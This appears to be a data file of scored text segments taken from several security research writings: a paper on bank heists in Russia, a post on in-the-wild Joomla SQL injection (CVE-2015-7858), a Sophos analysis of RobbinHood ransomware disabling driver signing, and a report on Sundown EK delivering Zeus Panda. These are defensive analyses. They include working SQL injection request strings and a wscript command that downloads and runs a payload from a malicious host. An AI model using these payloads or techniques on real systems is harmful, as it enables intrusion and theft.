"Carbanak was able to connect to ATMs through compromised workstations within the bank network. One strategy they used was to change the banknote denominations dispenser so that an accomplice could ask to withdraw, for example, ten 100 ruble banknotes and would instead receive ten 5,000 ruble banknotes [6]. In another case, they remotely controlled the ATM, instructing it to give out money at specific times, without the need for anyone to interact with it physically [7].",0.01344073775005128
"Such attacks on ATMs can result in huge financial losses for the affected banks, often running to millions of dollars.",0.022583988183699
Attacks on SWIFT terminals,0.008663044356170935
Another way for cybercriminals to make money while lurking in the financial institution's network is to find and compromise workstations used to make SWIFT transfers. SWIFT is an international transfer system used by banks all around the world.,0.023203640345201282
"In a recent case, Buhtrap operators were able to compromise a SWIFT administrator workstation, granting them the power to issue fraudulent SWIFT requests. The initial compromise was through a spear-phishing email sent directly to the SWIFT administrator with a Word document in an attachment. This document, supposedly detailing a conference for bank employees, was in fact built with Microsoft Word Intruder and thus contained code to exploit several known Word vulnerabilities. A couple of weeks elapsed before the heist was conducted. The fraudsters could use this time to gain knowledge of the bank's employee behaviour and how best the heist could be performed. Soon thereafter, the bank registered a loss of close to 100 million rubles and lost its licence in the aftermath. While we do not know with certainty who was behind the fraud, we know that the bank was targeted by the Buhtrap gang.",0.01249495531872491
Attacks on trading terminals,0.00752114192238329
"Having access to a trading terminal can bring significant benefits to the cybercriminals. The case we will discuss here is an attack on the Russian ruble exchange rate that allowed traders to make money on the strong variation that resulted. While direct usage of the terminal to influence stock or currency price is an option, cybercriminals can also gain insider information that they can leverage to make gains on the stock market.",0.02038308040590131
"The February 2015 attack on a trading terminal by the Corkow group was not a surprise for those who have tracked the associated malware family since its inception. The Corkow group focused on trading platforms almost from the beginning. It has specialized plug-ins, called DC, which can be used to extract information from these systems. Once executed, it collects browsing history, installed software, and running processes. It looks specifically for online banking applications, whether the user has visited sites for traders lately, or has installed applications for trading such as Finam Direct II, BlackWood Pro, Scottrade, QuoteTracker, eSignal, TraderBytes, ROX, Interactive Brokers, and others. In the third quarter of 2014, two new Corkow plug-ins made their appearance: QUIK and TRZQ. These modules are aimed at collecting credentials, account balance, settings, and other valuable information from two trading systems: QUIK Workstation and TRANSAQ.",0.013794354478890769
Figure 7: QUIK application.,0.013038645992445419
"One major incident, investigated by Group-IB, happened in a Russian bank located in Kazan [19]. According to their analysis, one of this bank's computers was successfully infected with Corkow.",0.013293525765398106
"This computer was used by bank employees as a trading terminal on the Moscow Exchange. While the attack occurred on 27 February 2015, the computer was infected by Corkow in September 2014. During this timeframe, malware operators were gathering information about the system and preparing for the attack. On Friday 27 February, when the bank employee was having lunch, malware operators placed a set of orders to buy and sell US$ on behalf of the bank. These orders resulted in the bank buying US$159 million and selling over US$94 million. These orders greatly affected the RUB/US$ rate, which swung between 55 and 66 RUB/US$ – a range an order of magnitude larger than normal. Fourteen minutes after the first order was passed, malware operators stopped issuing orders and wiped the trading terminal's disk drive in an attempt to hide traces of the attack.",0.015556657222835724
Figure 8: Anomaly caused by Corkow group in RUB/US$ exchange rate on 27 February 2015.,0.01662590131419428
"The bank lost US$3.2 million during that period. However, it is still unclear whether the attackers gained any profit from this incident as vast sums of money were needed to make any significant profit.",0.017581089843299313
Attacks on АРМ КБР (AWS CBC),0.02027908000265466
"Russian banks use a special system to transfer funds between themselves. A bank combines all payments made during a given period of time to other Russian banks in a settlement batch (банковский рейс). When the batch is ready to be sent, the bank signs and encrypts the data using special software called Automated Working Station of the Central Bank Client (AWS CBC) and sends it to the Central Bank of Russia. A bank will usually send such a batch five times per day. The AWS CBC software is freely available on the Central Bank official website.",0.01967955324588644
"When attackers successfully compromise a machine with this software installed, they can alter data in the settlement batch before such data can be signed and encrypted. For example, attackers can modify the destination account so that the transfer will be made to bank accounts controlled by attackers instead of their original destination. Alternatively, the attackers can just add new entries to the settlement batch. This is possible because the AWS CBC software does not verify the integrity or validity of the data. It is the responsibility of the banks to ensure that this data cannot be accessed and modified by unauthorized users.",0.01428824793292538
"Both Buhtrap and Corkow actively search for computers with this software running by looking for uarm.exe in the active process list. Once they find a candidate, they can install remote administration software to log into the computer remotely and try to update the aforementioned records.",0.010453738273789148
Future attacks,0.008645904190007658
We have surveyed several attacks that occurred against Russian financial institutions in this paper. How likely are we to see the same techniques applied to other regions of the world?,0.015046298940447511
"First, we need to look at the reasons why these highly specialized groups are now targeting financial institutions. They are looking for financial gains, but also to maximize their return on investment. Looking at how these institutions were breached, via exploitation of old vulnerabilities, social engineering and usage of third-party tools, it is not a surprise that seasoned cybercriminals are targeting them. While some institutions have good patching practices and other strong computer security procedures, a lot of them still don't. They represent the low‑hanging fruit for these criminal groups, who are now experts in financial fraud. It is thus very likely that we will see similar attacks against financial institutions in other countries in the near future.",0.014630306540895588
"In fact, this has already started, with several cases being publicized concerning cybercriminals able to compromise workstations used by SWIFT administrators and using those to wire huge sums of money to foreign accounts. The heist against Bangladesh Bank, the central bank of Bangladesh, where fraudsters attempted to wire US$951 million, is a prime example. While most of the transfers were blocked, several millions are still unaccounted for.",0.017002212381600268
"The other question is whether all of the techniques we have looked at might be used against other banks or banks in the western world. We will see how this will unfold, but as some targeted Russian banks had strong security measures in place, we can expect these types of attack to succeed at some point against banks in all regions of the world.",0.014048571730178705
Conclusion,0.008171308922719556
"We have reviewed different attacks against financial institutions in Russia and ascertained that these types of attacks and the techniques used are already spreading to the rest of the world. While the groups perpetrating these attacks are highly specialized and efficient, they are benefiting from the general lack of awareness surrounding targeted attacks against the financial sector. The attacks described in this paper are generally made possible initially through old vulnerabilities or social engineering. Regular patching of software, employee training and wide usage of two-factor authentication should help mitigate these attacks. There are more and more similarities between APT groups and cybercriminals targeting financial institutions. Besides the techniques used, another similarity is the way in which both groups achieve success by targeting the weakest link in the chain: the human factor.",0.01928621349302395
References,0.0158494738281566
"[1] FinCERT goals. «ФинЦЕРТ» Банка России.http://www.cbr.ru/credit/Gubzi_docs/main.asp?Prtid=fincert, webpage retrieved in June 2016.",0.014357172457955647
"[2] Interfax Russia. ЦБ заподозрил банки в использовании кибератак для вывода средств. http://www.interfax.ru/business/494833, webpage retrieved in June 2016.",0.02212817818154511
"[3] Cherepanov, A.; Lipovksy, R. Corkow: Analysis of a business-oriented banking Trojan. 2014.http://www.welivesecurity.com/2014/02/27/corkow-analysis-of-a-business-oriented-banking-trojan/.",0.011615966854165993
"[4] Rudnitsky, J.; Khrennikov, I. Russian Hackers Moved Ruble Rate With Malware. Bloomberg. 2016.http://www.bloomberg.com/news/articles/2016-02-08/russian-hackers-moved-currency-rate-with-malware-group-ib-says.",0.014126181715478858
"[5] Shestopal, O. Мошенники нанесли удар по ОРС. Kommersant.ru. 2016. http://www.kommersant.ru/doc/2795587.",0.019669364171152504
[6] Group-IB; Fox-IT. Anunak: APT Against Financial Institutions. December 2014. http://www.group-ib.com/files/Anunak_APT_against_financial_institutions.pdf.,0.012062633172852166
"[7] Kaspersky Lab. Carbanak APT, The Great Bank Robbery. February 2015. https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf.",0.013722458420091233
"[8] Sanger, E. D.; Perlroth, N. Bank Hackers Steal Millions via Malware. The New York Times. February 2015. http://www.nytimes.com/2015/02/15/world/bank-hackers-steal-millions-via-malware.html?_r=0.",0.012839946458746532
"[9] Boutin, J.-I. Operation Buhtrap, the Trap for Russian Accountants. April 2015. http://www.welivesecurity.com/2015/04/09/operation-buhtrap/.",0.01137690729535934
"[10] Group-IB. Buhtrap, the Evolution of Targeted Attacks against Financial Institutions. March 2016.http://www.group-ib.com/brochures/gib-buhtrap-report.pdf.",0.012686633817300508
"[11] Stoyanov, R. Russian Financial Cybercrime: How It Works. Securelist. November 2015.https://securelist.com/analysis/publications/72782/russian-financial-cybercrime-how-it-works/.",0.015717364402811684
[12] Kafeine. Meet Niteris EK (formerly known as CottonCastle). April 2014.http://malware.dontneedcoffee.com/2014/06/cottoncastle.html.,0.011073637527849178
"[13] Villeneuve, N; Homan, J. A New Word Document Exploit Kit. April 2015. https://www.fireeye.com/blog/threat-research/2015/04/a_new_word_document.html.",0.014012078495799996
"[14] Matrosov, A. All Carberp botnet organizers arrested. July 2012. http://www.welivesecurity.com/2012/07/02/all-carberp-botnet-organizers-arrested/.",0.015154635383866077
"[15] Szappanos, G. Microsoft Word Intruder Revealed. August 2015. https://www.sophos.com/en-us/medialibrary/PDFs/technical%20papers/sophos-microsoft-word-intruder-revealed.pdf.",0.011356141426821398
[16] Symantec. February 2016. http://www.symantec.com/connect/blogs/russian-bank-employees-received-fake-job-offers-targeted-email-attack.,0.01304738965563601
"[17] Boutin, J-I. Operation Buhtrap malware distributed via ammyy.com. November 2015.http://www.welivesecurity.com/2015/11/11/operation-buhtrap-malware-distributed-via-ammyy-com/.",0.01023948597550739
[18] Kaspersky. Carbanak and beyond: banks face new attacks. February 2016. http://www.kaspersky.com/about-us/news/virus/2016/Carbanak-and-beyond-banks-face-new-attacks.,0.015974282833550846
"[19] Group-IB. Analysis of Attacks Against Trading and Bank Card Systems. 2016. http://www.group-ib.ru/brochures/Group-IB-Corkow-Report-EN.pdf.
",0.012147621332388114
Joomla SQL Injection Attacks in the Wild,0.007453132891982905
"Nov 2016 Update: We released a new free guide to help you identify and remove Joomla hacks.
Read the Guide!
Last week, the Joomla team released an update to patch a serious vulnerability on Joomla 3.x. This vulnerability is an SQL injection (CVE-2015-7858) that allows for an attacker to take over a vulnerable site with ease. We predicted that the attacks would start in the wild very soon, due to the popularity of the Joomla platform along with how easy the exploitation was.",0.009628491195724287
"Attacks in the Wild – Patient Zero (2015 / Oct / 22)
We were right. Within 4 hours of the initial disclosure by Joomla and TrustWave, we saw direct attacks against 2 very popular Joomla sites that use our network. The attack tried to extract the current session from any logged in admin user and were blocked by our generic Joomla SQL Injection signatures:
/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1%20&list[select]=%20(select%201%20FROM(select%20count(*),concat((select%20(select%20concat(session_id))%20FROM%20jml_session%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)
What is very scary to think is that neither of these sites were patched at the time. The disclosure happened on a Thursday afternoon (evening in Europe), when many webmasters were already off for the day. Both sites would be compromised by now, if they were not deploying the defence in depth approach, which in their case, was to use a WAF on top of their site.
Attacks in the Wild – First Day (2015/Oct/23)
Within less than 24 hours after disclosure, we started to see Internet-wide scans trying to hit every single site on our network to see if they were vulnerable. They were leveraging 2 types of requests:
/index.php?option=com_contenthistory&view=history&list[select]=1
/index.php?option=com_contenthistory&view=history&layout=modal&tmpl=component&
field=jform_contenthistory&item_id=1&type_id=1
&type_alias=com_content.article&e11ddf616076d12a929967862cb0dd3c=1&
list[ordering]=editor&list[select]=
(select%20group_concat(username,%27|%27,email,%27|%27,name,%27|%27,
registerDate,%27|%27,lastvisitDate,%27|%27)%20
from%20jos_users)%20as%20`version_note`
The first one was just a simple request, not an actual exploit, looking for the default Joomla SQL syntax error page. If the SQL error page showed up, they knew the site was likely a viable target for a follow-up exploitation. The second request, was trying to get the admin user from the jos_users table.
In both cases, ff the following error was returned:",0.01192860853949329
"They knew they had a valid target based on the response. Note that during the first day since the release, the IP addresses we flagged in these attacks were mostly behind the Tor network.
Attacks in the Wild – Following Days
Starting over the weekend, attacks on the Joomla SQL injection vulnerability increased, with different attempts and variations being tried against every single site on our network. This is the growth of exploit attempts so far since disclosure:",0.011667815037690987
"What we found interesting was that many of the attacks started to check for the Joomla version before running the exploit payloads:
82.146.39.190 – – [26/Oct/2015:05:55:03 -0400] “GET /plugins/system/cache/cache.xml HTTP/1.1” 200
If the cache.xml returned a version over 3.x they would run the payload to try to get the admin session or a valid admin user:
82.146.39.190 – – [26/Oct/2015:12:18:29 -0400] “GET /?view=history&list[select]=extractvalue(rand(),concat(0x3a,(sElect(EXP(2))),0x3a,user()))&option=com_contenthistor
This likely saves them time with false positives and increases the odds of a successful exploitation attempts. Based on this pattern, it’s a very clear example of how basic automated scans can be adjusted to look for version numbers before applying more nefarious actions.
We are also seeing attacks leveraging the GoogleBot user agent, so do not get fooled by that. Googlebot would not try these types of requests:
176.111.109.92 – – [26/Oct/2015:13:03:47 -0400] “POST /index.php HTTP/1.1” 403
User Agent: “Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)”
BODY:option=com_contenthistory&view=history&list[select]=testsearch
Patch Now!
If you have not patched yet, do it now! We can’t stress this enough!
This data tell us is that the average webmaster has less than 24 hours to patch a site after a serious disclosure like this. That’s for the average website (small to medium size). If you have a popular site, you have only a couple of hours from disclosure to attack, so you have to react fast.
This is why we emphasize the importance of Defense in Depth. You can not just rely on being updated as your only layer of security. With the proper access control, monitoring, Intrusion detection and prevention system, you can be ahead when cases like this happen or even a 0-day exploit. In this specific scenario, security mechanisms that blocked generic SQL Injections and evasions, prevented the worst from happening.
",0.010155012373630368
Living off another land: Ransomware borrows vulnerable driver to remove security software,0.006885898427123394
"Written by
Andrew Brandt,",0.009161029206781302
Mark Loman,0.008670195522309743
"February 06, 2020",0.009989656856315698
SophosLabs Uncut Threat Research gdrv.sys Gigabyte Mikhail RobbinHood Robnhold,0.009226856685046636
"Sophos has been investigating two different ransomware attacks where the adversaries deployed a legitimate, digitally signed hardware driver in order to delete security products from the targeted computers just prior to performing the destructive file encryption portion of the attack.
The signed driver, part of a now-deprecated software package published by Taiwan-based motherboard manufacturer Gigabyte, has a known vulnerability, tracked as CVE-2018-19320. The vulnerability, published along with proof-of-concept code in 2018 and widely reported at the time, was disclaimed by the company, who told the researcher who tried to report the bug that “its products are not affected by the reported vulnerabilities.” The company later recanted, and has discontinued using the vulnerable driver, but it still exists, and it apparently remains a threat.",0.008644832537767377
"The sha1RSA Authenticode signature for the driver, with serial number 248472542c24ab8e429229acf121ca26 and thumbprint 32daee48ae406222c2bb92c4f1b7f516e537175a, expired on October 17, 2013.
In this attack scenario, the criminals have used the Gigabyte driver as a wedge so they could load a second, unsigned driver into Windows. This second driver then goes to great lengths to kill processes and files belonging to endpoint security products, bypassing tamper protection, to enable the ransomware to attack without interference.",0.009380960909117109
"This is the first time we have observed ransomware shipping a trusted, signed (yet vulnerable) third party driver to patch the Windows kernel in-memory, load their own unsigned malicious driver, and take out security applications from kernel space. The ransomware that was being installed in both instances calls itself RobbinHood.
Ransomware trying to circumvent security products is not new. For example, Nemty kills processes and services using regular taskkill, and Snatch ransomware figured out how to reboot PCs into Safe Mode to get around endpoint protection. Obviously, doing the process killing from kernel mode has a lot of advantages.
This article takes a deep dive on how the attackers do it. We’re publishing this information now so other defenders can anticipate and enact defenses against this novel attack, where adversaries bring a vulnerable third party driver to subvert the Windows kernel, terminate defenses, and encrypt files unhindered by endpoint protection software.
Attacking Windows defenses
We’ve recently seen the RobbinHood ransomware family perform this strategy to encrypt files without being hindered by endpoint protection software. They successfully subvert a setting in kernel memory on Windows 7, Windows 8 and Windows 10.
Without diving into the ransomware or data encryption itself, we’re going to focus on the module with which the adversaries can kill encountered endpoint protection software. This part of the attack consists of several files embedded in STEEL.EXE. All of these files are extracted to C:\WINDOWS\TEMP",0.010516535082670031
"STEEL.EXE
Kill application
This is the application that kills the processes and files of security products, using kernel drivers.",0.011735492088759125
"ROBNR.EXE
Driver installer
Deploys both the benign, signed third-party driver, and the criminals’ unsigned kernel driver. Once deployed, the unsigned driver gets loaded by abusing a known vulnerability in the third-party driver.",0.012093188234850172
"GDRV.SYS
Vulnerable kernel driver
A benign but outdated Authenticode-signed driver that contains a vulnerability.",0.010742130952678064
"RBNL.SYS
Malicious kernel driver
The malicious driver that can kill processes and delete files from kernel space.",0.009707254684493183
"PLIST.TXT
List of processes (and their associated files) to destroy
This is a text file containing the names of the applications the malicious driver will kill and delete. This text file is not embedded in STEEL.EXE and may be tailored to the victim’s environment.",0.009348606927584768
"STEEL.EXE
The STEEL.EXE application kills the processes and deletes the files of security applications. In order to do this, STEEL.EXE deploys a driver. The driver runs in kernel mode and is therefore optimally positioned to take out processes and files without being hindered by security controls like endpoint protection. Even though they run under NT AUTHORITY/SYSTEM, most parts of an endpoint security product run in user space.
The STEEL.EXE application first deploys ROBNR.EXE, which installs the malicious unsigned driver RBNL.SYS.
Once this driver is installed, STEEL.EXE reads the PLIST.TXT file and instructs the driver to delete any application listed in PLIST.TXT, then killing their associated processes. If the process was running as a service, the service can no longer automatically restart as the associated file has been deleted.
Once the STEEL.EXE process exits, the ransomware program can perform its encryption attack without being hindered by the security applications that have been taken out decisively.
ROBNR.EXE
This application is dropped to the disk by STEEL.EXE. This is a convenient application that drops and installs both the vulnerable GDRV.SYS driver, and the malicious RBNL.SYS driver.
64-bit Windows computers have a mechanism called driver signature enforcement which means that Windows only allows drivers to be loaded that have been properly signed by both the manufacturer and Microsoft. This is a requirement for all drivers in order to be loaded on 64-bit versions of Windows.
The malware authors did not bother to sign their malicious driver as it involves purchasing a certificate. Also, a purchased certificate can be revoked by the certificate authority causing the driver to no longer work, as it will no longer be accepted by Windows.
Instead, the malware authors chose a different route. The properly signed third party GDRV.SYS driver contains a privilege escalation vulnerability as it allows reading and writing of arbitrary memory. The malware authors abuse this vulnerability in order to (temporarily) disable driver signature enforcement in Windows – on-the-fly, in kernel memory. Once driver signature enforcement is disabled, the attackers are able to load their unsigned malicious driver.
Disabling Driver Signature Enforcement
The attackers are able to disable driver signature enforcement by changing a single variable (a single byte) that lives in kernel space. On Windows 7 (or older), this variable is called nt!g_CiEnabled (NTOSKRNL.EXE). On Windows 8 and 10, this variable is called ci!g_CiOptions (CI.DLL). In order to resolve the location of this variable, the attackers use a strategy taken from DSEFix.
On Windows 8 or 10, the trick starts by loading the standard Windows component CI.DLL as a data library using DONT_RESOLVE_DLL_REFERENCES in their process. Once CI.DLL is loaded, they query the location of CI.DLL in kernel memory via the GetModuleBaseByName function. It uses NtQuerySystemInformation(SystemModuleInformation …) to get the kernel addresses of all loaded kernel modules.
Decompiled: Showing how the variable is found that controls Driver Signing Enforcement.",0.022520045880829564
"Decompiled: Showing how to get a module’s kernel address.
Once they know those kernel addresses, the attackers resolve the exported CiInitialize function from the module’s export address table.Then they disassemble the instructions of that function in order to find the call CipInitialize() instruction. Once that function is found, they look for the mov dword ptr [address],ecx instruction. That address is g_CiOptions as shown in the figure below.
Decompiled: Showing how to find the location of g_CiOptions using the HDE disassembler.
Now that they know the location of the g_CiOptions variable in kernel space, the vulnerable third party driver is dropped to disk and started. See this article on the exact vulnerability. Any vulnerable driver that allows arbitrary read/write in kernel will do. So even though the attackers are using the GDRV.SYS driver to do this today, there’s no reason they will continue to use it if it becomes untenable to do so.
There are many other vulnerable drivers (with a similar vulnerability) in addition to the Gigabyte driver that these or other attackers may choose to abuse later, such as ones from VirtualBox (CVE-2008-3431), Novell (CVE-2013-3956), CPU-Z (CVE-2017-15302), or ASUS (CVE-2018-18537). But in these attacks, we’ve only seen the Gigabyte driver being abused in this way.
Decompiled: Showing how the malicious driver is deployed.
The malicious driver
Once the malicious driver is successfully deployed and started, the ROBNR.EXE process exits. Then STEEL.EXE starts processing the PLIST.TXT file, listing all the applications to kill.
This malicious kernel driver is used to terminate processes and delete the associated files. It employs several tricks to kill these applications, even when they are in-use and protected by tamper protection mechanisms employed by security products.
Decompiled: How the malicious driver starts.
Decompiled: How the malicious driver processes commands (IOCTL) from STEEL.EXE.
The following string was found in the malicious driver, indicating it was likely built by the same authors behind the RobbinHood ransomware.
C:\Users\Mikhail\Desktop\Robnhold\x64\Win7Release\Robbnhold.pdb
Deleting Files
The malicious driver has various ways to delete files. But it does not pick one way, it runs them all sequentially, in order to ensure the file really gets deleted.
To delete files that are in-use the malicious driver issues an I/O Request Packet (or IRP, a low-level message passed between device drivers) directly on the NTFS.SYS storage device. By clearing the ImageSectionObject and DataSectionObject pointers, the storage device assumes the files are not in-use and the file is safely deleted, even when the file is still running as a process!
This trick is similar to the technique mentioned on this blog post.
Decompiled: The malicious driver uses multiple ways to delete a file.
Decompiled: How the malicious driver deletes a file that is in-use.
Terminating Processes
Once the files are deleted, STEEL.EXE kills all the processes associated with the files. Again, it uses its malicious kernel driver to terminate the processes.
Decompile: How the malicious driver terminates a process.
Endpoint protection processes that rely on object handle filtering for their tamper protection cannot prevent a kernel mode termination of processes or deletion of files. The process handles opened by the malicious driver are kernel handles, and kernel handles cannot be filtered. So, the malicious kernel driver can kill these processes without interference of endpoint security controls. One solution is for the endpoint protection process to watch for any process trying to install these vulnerable kernel mode drivers, and prevent the installation from taking place.
If the process was running as a service, the Service Control Manager of Windows will (usually) try to restart the process that just got killed. But it will fail to do so as the related file no longer exists. Consequently, the application is effectively and permanently disabled. The failed attempts to restart the service show up in Event Logs.
When STEEL.EXE has killed all the processes and files in the PLIST.TXT list, it exits. Now the ransomware can encrypt all the files on the system unhindered.
What users can do to prevent this type of attack
Computers that are fully patched and have no known vulnerabilities can still end up in ruin because this attacker brings his own vulnerability. So what can you do to prevent the initial access by the attacker?
Adopt a three-pronged approach to minimize your risk of falling victim to an attack.
1. Threat protection that disrupts the whole attack chain
Today’s ransomware attacks use multiple techniques and tactics, so focusing your defense on a single technology leaves you very vulnerable.
Instead, deploy a range of technologies to disrupt as many stages in the attack as possible. And integrate the public cloud into your security strategy.
2. Strong security practices
These include:",0.022071128314843702
"Use multi-factor authentication (MFA)
Use complex passwords, managed through a password manager
Limit access rights; give user accounts and admins only the access rights they need
Make regular backups, and keep them offsite and offline where attackers can’t find them
Lock down your RDP; turn it off if you don’t need it, use rate limiting, 2FA or a VPN if you do
Ensure tamper protection is enabled – other ransomware strains attempt to disable your endpoint protection, and tamper protection is designed to prevent this from happening",0.016392673354154175
"3. Ongoing staff education
People are invariably the weakest link in cybersecurity, and cybercriminals are experts at exploiting normal human behaviors for nefarious gain. Invest – and keep investing – in staff training.
IoCs
We analyzed the following files in the course of this investigation",0.01728742924546589
"SHA256
Filename",0.009227344282289662
"791c32a95f401f7464214960e49e716656f6fd6fff135ac2a6ba607236d3346e
STEEL.EXE",0.008930665719061315
"99c3cc348f8ee4e87bce45b1dd185d31830c370ac43fd3e39ac50340f029ef79
ROBNR.EXE",0.009336225013019672
"0b15b5cc64caf0c6ad9bd759eb35383b1f718edf3d7ab4cd912d0d8c1826edf8
RBNL.SYS",0.008758143985909683
"31f4cfb4c71da44120752721103a16512444c13c2ac2d857a7e6f13cb679b427
GDRV.SYS",0.00838498892637074
"Acknowledgments
SophosLabs would like to acknowledge the contributions of Anand Ajjan, Richard Cohen, Sivagnanam Gn, Roland Gyorffi, Erik Loman, Peter Mackenzie, Vikas Singh, Gabor Szappanos, Alex Vermaning and Michael Wood to the analysis for this post.",0.014470899823236683
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"17
",0.014677742533125038
Zeus Panda Delivered By Sundown - Targets UK Banks,0.01297945350466545
"Last week we noticed that Sundown Exploit Kit (EK) was distributing a banking trojan. Upon further investigation we discovered that the banking trojan was a new version of Zeus Panda. This malware has previously been delivered by the Angler, Nuclear and Neutrino EKs.
Sundown EK Landing Page
The Sundown EK landing page obfuscation has undergone several evolutions recently, indicating that the developer is highly active. An example of the landing page from July 25, 2016 was as below.",0.016720160310590315
"The exploits used by Sundown are dynamically written onto the page from the base64-encoded content on the landing page.
Sundown EK Exploits
While Sundown does not have the maturity and infrastructure of other EKs yet, its implementation of modern exploits makes it a dangerous threat. We are currently aware of three vectors that Sundown uses for exploiting a browser and executing malware:",0.013032716500553598
"Adobe Flash Player exploits (CVE-2015-0313 & CVE-2015-0311)
Microsoft Silverlight exploit (CVE-2016-0034)
Internet Explorer (IE) exploits (CVE-2015-2419 & CVE-2016-0189)",0.01996172859084988
"All of these exploits attempt to execute shellcode which will download and execute a payload from another Sundown EK URL. The only significant difference between the exploit payload deliveries is that the IE exploits receive an RC4-encrypted version of the malware from ""y.php"" whereas the Flash and Silverlight exploits receive an unencrypted version of the malware from ""z.php"".
When we analysed the shellcode used in the IE CVE-2015-2419 exploit we observed cmd.exe being invoked with a command line to save a file to disk under ""%tmp%\r3ak.tmp"" and then execute the script with some parameters.",0.009193591779194543
"The script written to r3ak.tmp is a JScript which will download a payload from a URL provided, using a specified user-agent string. It will then RC4 decrypt the payload using a key given in the parameters and will finally execute the payload as an exe file.
In this example the script downloads the encrypted payload from ""hxxp://ytbuybytvtrcevrtbyybyttvrcrvbyynubyvrvgh[.]xyz/y.php?id=67"" and decrypts it using the key ""gexywoaxor"". The following command line is used to invoke the script which does this:",0.008918580935533327
"wscript /B /E:JScript r3ak.tmp ""gexywoaxor"" ""hxxp://ytbuybytvtrcevrtbyybyttvrcrvbyynubyvrvgh[.]xyz/y.php?id=67"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)""
Zeus Panda Malware
Last week we noticed that Sundown was distributing the Panda banking trojan. This is an improved variant of the Zeus (Zbot) banking trojan, containing JSON and base64-encoded configurations and modules. We have blogged about Zeus variants in the past:",0.01199010116927468
"Crimeware Based Targeted Attacks: Citadel Case, Part III
Zeus PIF - The Evolving Strain Looking To Defeat Your Security Software",0.015814243591746435
"Configuration
Zeus Panda's main configuration is downloaded from its command-and-control (C&C) and contains information regarding the associated botnet ID and additional modules to download.",0.01511110827281803
Zeus's main capabilities include:,0.010233528176058604
"Credential theft from various software such as browsers and FTP clients.
Browser infection to steal banking traffic, take screenshots, and modify pages (man-in-the-browser).
Remote desktop via VNC.",0.010318598641462229
"Browser Infection
The malware will download typical Zeus ""webinjects"" which will allow browser pages to be modified.",0.011964730011429392
"These injections are used for modifying banking login pages in order to prompt a user for additional login details. This is done by the malware inserting itself into browsers (i.e. IE, Chrome, or Firefox) and modifying the content it receives from banking sites. This is known as a man-in-the-browser (MITB) attack, where the banking websites themselves are not infected but the user's browser is.
The details collected from these injections are then sent to the attacker's C&C where they will be used to login and steal money from a user's account.
Automated Transfer Scripts
The Zeus Panda sample we analysed (SHA1 ccf17e27c0e5883920bb6abea5bc5d6c2c7a1c37) used automated transfer scripts (ATS) from ""hxxps://alvijob[.]website/"" to inject code into banking websites. ATS are essentially javascript files which are hosted on a third party website, and contain code which will change the content of a banking website. These javascript files can be updated without having to push a new configuration update to the malware.
The following example shows an ATS injection modifying a banking login page to prompt for card reader information. This information is not usually required for a normal login, and will instead be stolen by the malware.",0.0172790549277676
"The author of the ATS web injections also appears to be working on targeting Australian banking websites, but as of yet there is only one injection which simply displays an alert if the site is visited:",0.010030703459412038
Zeus Panda attempts to defraud customers of the following financial institutions:,0.011808899588697686
"Barclays
Lloyds Bank
NatWest
RBS
Halifax
Bank of Scotland
HSBC
Santander
Nationwide
Metro Bank
Co-operative Bank
cahoot
Intelligent Finance
PayPal
eBay",0.020386757044197568
"Debug Log
The Zeus Panda build we analysed had its debug output enabled so we were able to gain some insight into what it was doing at each stage of infection.",0.01313571835790417
"The names of some of the classes used in the source code are visible in the debug log, including previously known Zeus classes like ""DynamicConfig"". We can also see the Zeus Panda build version number here, which is ""2.2.5"".
Protection Statement
Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:",0.014087378590371458
"Stage 4 (Exploit Kit) - The Sundown EK sites are detected and blocked.
Stage 5 (Dropper File) - The Zeus Panda malware files are detected.",0.02148298327596454
"Summary
The Zeus banking trojan was first identified in 2007 and its source code was leaked in 2011. Since 2011 there have been many spin-offs of Zeus, and evidently it still remains a popular choice for criminals. It is important to keep browser plug-ins such as Adobe Flash Player and Microsoft Silverlight up to date. It is also vital to keep up with the latest versions of browsers like IE, FireFox and Chrome in order to protect against exploit kits looking to deliver nasty malware such as Zeus Panda.
Indicators of Compromise (IOC)
Sundown EK",0.01164643183568026
"hxxp://adsfgukhfgtiyasdftoduaystfuodastfuadstuf.faith
hxxp://hkyjthrgecrvhdtfbygnumiunybfvdrcrvfbgyjnkhmi.xyz
hxxp://ytbuybytvtrcevrtbyybyttvrcrvbyynubyvrvgh.xyz
hxxp://dsjkfsjkdhfjshdfjkvkjbsvjksbvdkbsvjkbsvj.xyz
hxxp://djsdhsdkjhsdfkjjsdfkkjbsdfsdjkjksdjbksdf.xyz
hxxp://dkjjfhjsdfdjksdhfjksdfkjbsfhbsfhuyuiwqui.xyz
hxxp://wejwerbjjrwjbkwrbjkwerbjkwerbjkwerjkbwer.xyz
hxxp://rgdgfrsgfreagfer.xyz
hxxp://cfisniuhicdngbhncmjifnvgfhtgjmicfgdjvgjh.xyz
hxxp://ahoqeihiofehihiwefihoweohwefihihfeihwefh.xyz
hxxp://cfhdnfvnkfcmjfgvkdgkdjhmdvjgnkdfvknvhdfm.xyz
hxxp://dhsfiugduisdfuiudjfhuisdfhisjdhfifjshdifhuis.xyz
hxxp://fgfbhnjhbgvfccsgvhbnuiuybtyvtrerxwcevrbtynyt.xyz
hxxp://dhsfiugduisdfuiudjfhuisdfhisjdhfifjshdif.xyz
hxxp://cfisniuhicdngbhncmjifnvgfhtgjmicfgdjvgjhfncf.xyz
hxxp://adfouhafouihfaohfaoifadhafdihafdohfadouh.faith
hxxp://sihasfidhfasdihdfadkiga.xyz
hxxp://djhfsdhfiwebsddbijskdbfisjdbisjbfihsbjks.xyz
hxxp://wqwuioeguhdbhsdvbhsvbusdfbuwevbuwhejfbshdfbi.xyz
hxxp://wqwuioeguhdbhsdvbhsvbusdfbuwevbuwhejfbsh.xyz
hxxp://wejkbweb3jkwejbbjwejbrebjwerjbewjkbwerbj.xyz
hxxp://wejkbweb3jkwejbbjwejbrebjwerjbewjkbwerbjkerw.xyz
hxxp://sodgihiegashiosgeadkiga.xyz
hxxp://sodgihiegashiosgea.xyz
hxxp://sodgihiegashiosgeadkigasdj.xyz
hxxp://adsfhdpfasihiadfps.xyz
hxxp://sertegegtgtregetg.xyz
